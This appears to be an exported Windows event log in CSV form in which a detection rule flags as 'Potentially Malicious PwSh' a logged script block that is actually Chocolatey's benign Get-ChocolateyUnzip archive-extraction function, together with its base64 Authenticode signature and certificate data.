hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xs","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: e80ddd53-40cb-4fd7-8441-1ba99d455693 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xs","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.725 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,59,"ScriptBlock: IOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgweHzSplZ494On1UQFNZDNo1+C5hVFonFT0Z4 # XKG21e0wDQYJKoZIhvcNAQEBBQAEggEABukrTx8PYcKco9MQ6RcHIKVMqR9HLAnV # PohcjWRijEW5TfoLp6uGzyhKKHGDjH0+ZwkJ+J5O3IX5erp7MUuTVidPB87iW1Gz # fUgUvX12PnTzEvOp3p49uyqCzeXgH4NVl6/iZsYqlKefg94rX6oOBhMAWFotjBu9 # 